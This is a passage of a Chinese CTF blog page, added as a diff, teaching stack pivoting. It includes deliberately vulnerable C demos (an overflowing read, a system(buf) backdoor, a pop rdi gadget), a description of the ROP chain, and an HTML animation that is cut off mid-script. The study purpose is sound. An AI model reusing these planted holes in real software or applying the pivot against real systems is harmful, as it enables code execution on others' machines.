@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="light">
+  <head>
+    
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>栈迁移 | JerryXie&#39;s Blog</title>
+<meta name="description" content="CTF, digital forensics, offensive security, and study notes.">
+<meta name="theme-color" content="#f5f5f7">
+<meta name="referrer" content="no-referrer">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈迁移 | JerryXie&#39;s Blog">
+<meta property="og:description" content="CTF, digital forensics, offensive security, and study notes.">
+
+  <meta property="og:url" content="https://jerryxie.top/notes/ctf/pwn知识点学习/栈迁移/">
+  <link rel="canonical" href="https://jerryxie.top/notes/ctf/pwn知识点学习/栈迁移/">
+
+
+  <meta name="author" content="JerryXie">
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="/js/main.js"></script>
+
+  <meta name="generator" content="Hexo 8.1.1"></head>
+  <body>
+    <div class="scroll-progress" data-scroll-progress></div>
+    <div class="site-shell">
+      
+<header class="site-header">
+  <div class="header-inner">
+    <a class="brand" href="/">
+      <span class="brand-mark"></span>
+      <span class="brand-name">JerryXie&#39;s Blog</span>
+    </a>
+
+    <button class="menu-toggle" type="button" data-menu-toggle aria-label="Toggle navigation">
+      <span></span><span></span><span></span>
+    </button>
+
+    <nav class="site-nav" data-menu-panel>
+      
+        <a href="/" class="">Home</a>
+      
+        <a href="/archives/" class="">Archive</a>
+      
+        <a href="/categories/" class="">Library</a>
+      
+        <a href="/about/" class="">About</a>
+      
+    </nav>
+
+    <button class="theme-toggle" type="button" data-theme-toggle aria-label="Toggle theme">
+      <span data-theme-icon>Dark</span>
+    </button>
+  </div>
+</header>
+
+      <main class="page-shell">
+        
+
+<article class="article-layout">
+  <div class="article-main card-panel">
+    <a class="back-link" href="/categories/">Back to library</a>
+    <header class="article-header">
+      <div class="article-badges">
+        
+          
+            <a class="category-chip" href="/categories/ctf/">ctf</a>
+          
+            <a class="category-chip" href="/categories/ctf/pwn%E7%9F%A5%E8%AF%86%E7%82%B9%E5%AD%A6%E4%B9%A0/">pwn知识点学习</a>
+          
+        
+      </div>
+      <h1>栈迁移</h1>
+      <div class="article-meta">
+        <span>Published 2026-04-19</span>
+        <span>Updated 2026-04-19</span>
+        <span>25 min</span>
+      </div>
+      
+        <p class="article-source">Source path: <code>ctf/pwn知识点学习/栈迁移.md</code></p>
+      
+    </header>
+
+    <div class="article-content">
+      <p>本质：将<strong>rbp&#x2F;rsp</strong>迁移至其它地方的一种手段使用指令:</p>
+<p>leave、pop rbp</p>
+<p>目的：</p>
+<p>①可以与输入函数搭配使用，实现任意地址写</p>
+<p>②变相增加溢出长度。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cyy001128/article/details/146882575?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%A0%88%E8%BF%81%E7%A7%BB&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-146882575.142%5Ev102%5Epc_search_result_base7">栈迁移学习-CSDN博客</a></p>
+<h2 id="①可以与输入函数搭配使用，实现任意地址写"><a href="#①可以与输入函数搭配使用，实现任意地址写" class="headerlink" title="①可以与输入函数搭配使用，实现任意地址写"></a>①可以与输入函数搭配使用，实现任意地址写</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1np4y1d7pu?spm_id_from=333.788.videopod.sections&vd_source=7564738e9554c00c8cc808fd3016b121">pwn技术分享-栈迁移1 - bilibili.com</a></p>
+<h3 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h3><p>以下是一个例题：</p>
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -z execstack -fno-stack-protector -no-pie -z norelro -o demo6 demo6.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> passwd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">in_test1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> str1[<span class="number">0x48</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input2:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, str1, <span class="number">0x58</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    init_func();</span><br><span class="line">    in_test1();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input1:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;x);</span><br><span class="line">    <span class="keyword">if</span> (passwd == <span class="number">0x1234</span> &amp;&amp; x == <span class="number">0x1234</span>) &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译一下即可（linux环境）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766301054370-53c1f12b-ae27-4dc9-b321-991591bd6317.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766301430427-4ca4f53b-b8a1-4e55-aefd-4575388749dc.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>这里是主函数和test函数，思路是利用栈迁移的办法，把rbp转移到<strong>passwd+0xC</strong>（当然这里的0xC根据不同的编译环境会有变化的）的地址，此时rbp+var_C&#x3D;passwd+0xC-0xC&#x3D;passwd；然后再执行main函数，这样一来x和passwd指向的是同一个地址，也就是说下面的if判断其实指向的是同一个值。（具体动调可以参考上面的视频）</p>
+<p>这里我们可以看看ida的汇编代码：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766304779746-d6e47b47-1120-4552-9f00-028832fbb859.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><strong>为什么是</strong><code>**passwd_addr+0xC**</code><strong>?</strong></p>
+<p>原因是实际赋值的地址是<code>rbp+var_C</code>，而<code>var_C= dword ptr - 0xCh</code></p>
+<p>也就是说需要让<code>**passwd_addr**</code><strong>加上</strong><code>**0xCh**</code><strong>之后再减回去才能做到给passwd赋值</strong></p>
+<blockquote>
+<p><code>dword ptr</code> 是汇编语言里的“<strong>操作数大小前缀</strong>”，用来告诉 CPU：“我这次要访问的内存单元是 <strong>4 字节（double-word）</strong>。”</p>
+</blockquote>
+<p>以下下是exp：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766301487166-693c1ccb-e5ba-4c70-899d-2caab1abdff5.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<blockquote>
+<p>py中动态调试：<code>gdb.attach(io)</code></p>
+</blockquote>
+<h2 id="②变相增加溢出长度。"><a href="#②变相增加溢出长度。" class="headerlink" title="②变相增加溢出长度。"></a>②变相增加溢出长度。</h2><details class="lake-collapse"><summary id="u8a76e22d"><span class="ne-text">正常情况下做栈溢出的题（扫盲）</span></summary><p id="u94d27d64" class="ne-p" style="text-align: center"><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766366415351-ea0368a3-8437-4f6d-8f31-4f3120ebab78.png" width="436.8" id="If4Qb" class="ne-image" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p><p id="u500b5a84" class="ne-p"><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766366435564-5a7ac71c-e87c-4656-85c5-d222473a4211.png" width="1252" id="bjJse" class="ne-image" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p><div class="ne-quote"><p id="u5f062cdc" class="ne-p"><span class="ne-text">扫盲：传参顺序</span><code class="ne-code"><span class="ne-text">rdi,rsi,rdx,rcx,r8,r9</span></code></p><p id="u6532a7a5" class="ne-p"><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766366460540-d838ea4a-dcc8-4540-9d47-b0e1f404caa9.png" width="1068.8" id="Mu1W4" class="ne-image" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p><p id="ud3ad2c6d" class="ne-p"><br></p></div><figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">低地址  ←  栈顶 (RSP指向这里)</span><br><span class="line">┌─────────────────────┐</span><br><span class="line">│   buffer[<span class="number">0</span>]         │  &lt;- buffer起始</span><br><span class="line">│   ...               │</span><br><span class="line">│   buffer[<span class="number">79</span>]        │  &lt;- buffer最高索引</span><br><span class="line">├─────────────────────┤</span><br><span class="line">│   （其他局部变量）   │  &lt;- 可能存在的其他变量</span><br><span class="line">├─────────────────────┤</span><br><span class="line">│   旧的RBP           │  &lt;- <span class="number">8</span>字节 (<span class="number">64</span>位)</span><br><span class="line">├─────────────────────┤</span><br><span class="line">│   返回地址 (RIP)    │  &lt;- <span class="number">8</span>字节 (<span class="number">64</span>位)</span><br><span class="line">├─────────────────────┤</span><br><span class="line">│   函数参数          │  &lt;- 调用者使用的参数</span><br><span class="line">└─────────────────────┘</span><br><span class="line">高地址  ←  栈底</span><br></pre></td></tr></table></figure></details>
+### demo2
+<figure class="highlight c" data-language="c" data-language-label="C"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在程序目录下用该指令编译：gcc -z execstack -fno-stack-protector -no-pie -z norelro -O0 demo2.c</span></span><br><span class="line"><span class="comment">//得到一个a.out的程序</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> passwd = <span class="number">0x0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">in_test1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> str1[<span class="number">0x48</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str1 is %p,input2:&quot;</span>,&amp;str1);</span><br><span class="line">    read(<span class="number">0</span>,str1,<span class="number">0x60</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">backdor</span><span class="params">(<span class="type">char</span>* buf)</span>&#123;</span><br><span class="line">    system(buf);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">tmp_tmp</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;pop %rdi;ret;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里题目很好心的给了一个pop rdi</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    init_func();</span><br><span class="line">    in_test1();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766375331985-b12be1a3-93ac-4d51-84df-a5ce5014ae8f.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>逻辑是：</p>
+<p>先溢出（可以覆盖0x10（dec&#x3D;16）个字节，先覆盖<code>保存的rbp</code>（即旧的rbp，可以理解成caller的基地址），再覆盖返回地址），修改返回地址（就是被覆盖之后他还是会接着执行剩下的汇编指令的）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1766375501601-c5ab7f72-1b8b-4e08-b640-b0d815aa8941.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>把retn换成覆盖成leave，也就是执行两次；然后再在栈上放上对应的rdi、&#x2F;bin&#x2F;sh、backdoor即可。</p>
+<p>重点是<code>**执行两次leave**</code></p>
+<p>这里我让gemini写了一个html动画</p>
+<details class="lake-collapse"><summary id="u23151dc9"><span class="ne-text">html动画</span></summary><figure class="highlight html" data-language="html" data-language-label="HTML"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Stack Pivot &amp; ROP 动画演示<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.tailwindcss.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.stack-cell</span> {</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: all <span class="number">0.3s</span> ease;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">48px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#444</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: monospace;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.pointer-container</span> {</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">right</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">gap</span>: <span class="number">2px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: flex-end;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">30</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.pointer-tag</span> {</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">1px</span> <span class="number">6px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">4px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.tag-rsp</span> { <span class="attribute">background</span>: <span class="number">#ef4444</span>; }</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.tag-rbp</span> { <span class="attribute">background</span>: <span class="number">#3b82f6</span>; }</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.tag-rip</span> { <span class="attribute">background</span>: <span class="number">#10b981</span>; }</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.highlight-change</span> {</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#fef08a</span> <span class="meta">!important</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">color</span>: <span class="number">#b91c1c</span> <span class="meta">!important</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">border-color</span>: <span class="number">#f59e0b</span> <span class="meta">!important</span>;</span></span><br><span class="line"><span class="language-css">    }</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.memory-row</span><span class="selector-pseudo">:nth-child</span>(even) { <span class="attribute">background-color</span>: <span class="number">#f9fafb</span>; }</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.hidden-content</span> { <span class="attribute">color</span>: transparent <span class="meta">!important</span>; <span class="attribute">border-style</span>: dashed <span class="meta">!important</span>; <span class="attribute">opacity</span>: <span class="number">0.3</span>; }</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.revealed-content</span> { <span class="attribute">animation</span>: fadeIn <span class="number">0.5s</span> forwards; }</span></span><br><span class="line"><span class="language-css">    <span class="keyword">@keyframes</span> fadeIn {</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">from</span> { <span class="attribute">color</span>: transparent; }</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">to</span> { <span class="attribute">color</span>: <span class="number">#374151</span>; }</span></span><br><span class="line"><span class="language-css">    }</span></span><br><span class="line"><span class="language-css">&amp;lt;/style&amp;gt;</span></span><br></pre></td></tr></table></figure>
+<p>&lt;&#x2F;head&gt;<br>&lt;body class&#x3D;&quot;bg-gray-100 min-h-screen p-4 md:p-8 font-sans text-gray-800&quot;&gt;<br>    &lt;div class&#x3D;&quot;max-w-6xl mx-auto bg-white rounded-xl shadow-2xl p-6 border border-gray-200&quot;&gt;<br>        &lt;h1 class&#x3D;&quot;text-2xl font-bold mb-6 text-gray-800 border-b pb-4 text-center&quot;&gt;栈溢出：Stack Pivot (Leave-Ret) 深度演示&lt;&#x2F;h1&gt;</p>
+<pre><code>    &amp;lt;div class=&amp;quot;grid grid-cols-1 lg:grid-cols-12 gap-8&amp;quot;&amp;gt;
+        &amp;lt;!-- 状态面板 --&amp;gt;
+        &amp;lt;div class=&amp;quot;lg:col-span-4 space-y-4&amp;quot;&amp;gt;
+            &amp;lt;div class=&amp;quot;bg-gray-50 p-5 rounded-xl border border-gray-200 shadow-sm&amp;quot;&amp;gt;
+                &amp;lt;h2 class=&amp;quot;font-bold mb-4 text-xs uppercase tracking-wider text-gray-500&amp;quot;&amp;gt;寄存器状态&amp;lt;/h2&amp;gt;
+                &amp;lt;div class=&amp;quot;space-y-3 font-mono text-lg&amp;quot;&amp;gt;
+                    &amp;lt;div class=&amp;quot;flex justify-between items-center border-b border-gray-100 pb-2&amp;quot;&amp;gt;
+                        &amp;lt;span class=&amp;quot;text-gray-400 text-sm&amp;quot;&amp;gt;RSP&amp;lt;/span&amp;gt;
+                        &amp;lt;span id=&amp;quot;reg-rsp&amp;quot; class=&amp;quot;font-bold text-red-600 bg-red-50 px-2 rounded&amp;quot;&amp;gt;0x??&amp;lt;/span&amp;gt;
+                    &amp;lt;/div&amp;gt;
+                    &amp;lt;div class=&amp;quot;flex justify-between items-center border-b border-gray-100 pb-2&amp;quot;&amp;gt;
+                        &amp;lt;span class=&amp;quot;text-gray-400 text-sm&amp;quot;&amp;gt;RBP&amp;lt;/span&amp;gt;
+                        &amp;lt;span id=&amp;quot;reg-rbp&amp;quot; class=&amp;quot;font-bold text-blue-600 bg-blue-50 px-2 rounded&amp;quot;&amp;gt;0x??&amp;lt;/span&amp;gt;
+                    &amp;lt;/div&amp;gt;
+                    &amp;lt;div class=&amp;quot;flex justify-between items-center border-b border-gray-100 pb-2&amp;quot;&amp;gt;
+                        &amp;lt;span class=&amp;quot;text-gray-400 text-sm&amp;quot;&amp;gt;RIP&amp;lt;/span&amp;gt;
+                        &amp;lt;span id=&amp;quot;reg-rip&amp;quot; class=&amp;quot;font-bold text-green-600 bg-green-50 px-2 rounded&amp;quot;&amp;gt;0x??&amp;lt;/span&amp;gt;
+                    &amp;lt;/div&amp;gt;
+                &amp;lt;/div&amp;gt;
+            &amp;lt;/div&amp;gt;
+            
+            &amp;lt;div class=&amp;quot;bg-gray-900 p-5 rounded-xl shadow-inner&amp;quot;&amp;gt;
+                &amp;lt;h2 class=&amp;quot;font-bold mb-2 text-xs uppercase tracking-wider text-gray-500&amp;quot;&amp;gt;当前原子指令&amp;lt;/h2&amp;gt;
+                &amp;lt;div id=&amp;quot;current-instr&amp;quot; class=&amp;quot;text-green-400 font-mono text-xl min-h-[48px] flex items-center&amp;quot;&amp;gt;
+                    -
+                &amp;lt;/div&amp;gt;
+            &amp;lt;/div&amp;gt;
+
+            &amp;lt;div class=&amp;quot;grid grid-cols-2 gap-3&amp;quot;&amp;gt;
+                &amp;lt;button onclick=&amp;quot;prevStep()&amp;quot; id=&amp;quot;prev-btn&amp;quot; class=&amp;quot;bg-white border-2 border-gray-200 hover:border-gray-400 text-gray-700 font-bold py-3 px-4 rounded-lg transition disabled:opacity-30&amp;quot;&amp;gt;
+                    上一步
+                &amp;lt;/button&amp;gt;
+                &amp;lt;button onclick=&amp;quot;nextStep()&amp;quot; id=&amp;quot;next-btn&amp;quot; class=&amp;quot;bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg shadow-md transition&amp;quot;&amp;gt;
+                    下一步
+                &amp;lt;/button&amp;gt;
+                &amp;lt;button onclick=&amp;quot;reset()&amp;quot; class=&amp;quot;col-span-2 border border-gray-300 hover:bg-100 text-gray-500 font-medium py-2 px-4 rounded-lg transition text-sm&amp;quot;&amp;gt;
+                    重置演示
+                &amp;lt;/button&amp;gt;
+            &amp;lt;/div&amp;gt;
+
+            &amp;lt;div class=&amp;quot;p-5 bg-amber-50 rounded-xl text-sm text-amber-900 leading-relaxed border border-amber-100 shadow-sm min-h-[150px]&amp;quot;&amp;gt;
+                &amp;lt;div class=&amp;quot;flex items-center font-bold mb-2&amp;quot;&amp;gt;
+                    &amp;lt;svg class=&amp;quot;w-4 h-4 mr-2&amp;quot; fill=&amp;quot;currentColor&amp;quot; viewBox=&amp;quot;0 0 20 20&amp;quot;&amp;gt;&amp;lt;path fill-rule=&amp;quot;evenodd&amp;quot; d=&amp;quot;M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z&amp;quot; clip-rule=&amp;quot;evenodd&amp;quot;&amp;gt;&amp;lt;/path&amp;gt;&amp;lt;/svg&amp;gt;
+                    详细步骤说明
+                &amp;lt;/div&amp;gt;
+                &amp;lt;p id=&amp;quot;step-description&amp;quot;&amp;gt;点击“下一步”开始。&amp;lt;/p&amp;gt;
+            &amp;lt;/div&amp;gt;
+        &amp;lt;/div&amp;gt;
+
+        &amp;lt;!-- 栈内存展示 --&amp;gt;
+        &amp;lt;div class=&amp;quot;lg:col-span-8&amp;quot;&amp;gt;
+            &amp;lt;div class=&amp;quot;flex font-bold text-gray-400 text-[10px] uppercase tracking-widest mb-3 px-4&amp;quot;&amp;gt;
+                &amp;lt;div class=&amp;quot;w-20&amp;quot;&amp;gt;地址&amp;lt;/div&amp;gt;
+                &amp;lt;div class=&amp;quot;flex-1 text-center&amp;quot;&amp;gt;内存数据 (Value)&amp;lt;/div&amp;gt;
+                &amp;lt;div class=&amp;quot;w-40 text-right&amp;quot;&amp;gt;备注&amp;lt;/div&amp;gt;
+            &amp;lt;/div&amp;gt;
+            &amp;lt;div id=&amp;quot;stack-container&amp;quot; class=&amp;quot;border-2 border-gray-300 rounded-xl overflow-hidden relative shadow-lg bg-white&amp;quot;&amp;gt;
+                &amp;lt;!-- 动态生成的栈行 --&amp;gt;
+            &amp;lt;/div&amp;gt;
+        &amp;lt;/div&amp;gt;
+    &amp;lt;/div&amp;gt;
+&amp;lt;/div&amp;gt;
+
+&amp;lt;script&amp;gt;
+    const initialStack = [
+        { addr: &#39;0xa1&#39;, val: &#39;0x1111&#39;, note: &#39;New RBP Content&#39;, id: &#39;m-a1&#39;, hidden: true },
+        { addr: &#39;0xa9&#39;, val: &#39;pop_rdi&#39;, note: &#39;ROP Gadget 1&#39;, id: &#39;m-a9&#39;, hidden: true },
+        { addr: &#39;0xb1&#39;, val: &#39;0xc8&#39;, note: &#39;Arg: /bin/sh addr&#39;, id: &#39;m-b1&#39;, hidden: true },
+        { addr: &#39;0xb9&#39;, val: &#39;ret&#39;, note: &#39;Stack Align&#39;, id: &#39;m-b9&#39;, hidden: true },
+        { addr: &#39;0xc1&#39;, val: &#39;backdoor&#39;, note: &#39;Target Func&#39;, id: &#39;m-c1&#39;, hidden: true },
